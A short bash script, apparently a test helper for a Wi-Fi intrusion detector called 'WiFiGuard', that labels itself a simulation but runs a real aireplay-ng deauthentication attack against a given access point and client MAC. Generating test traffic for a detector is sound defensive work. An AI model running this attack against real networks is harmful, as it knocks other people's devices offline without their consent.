#!/bin/bash
INTERFACE="${1:-wlan1mon}"
AP_MAC="${2:-AA:BB:CC:DD:EE:03}"
CLIENT_MAC="${3:-AA:BB:CC:DD:EE:02}"
COUNT="${4:-50}"

echo "[WiFiGuard] 模拟Deauth攻击..."
echo "  接口: $INTERFACE"
echo "  AP MAC: $AP_MAC"
echo "  客户端: $CLIENT_MAC"
echo "  攻击次数: $COUNT"

sudo aireplay-ng --deauth "$COUNT" -a "$AP_MAC" -c "$CLIENT_MAC" "$INTERFACE"
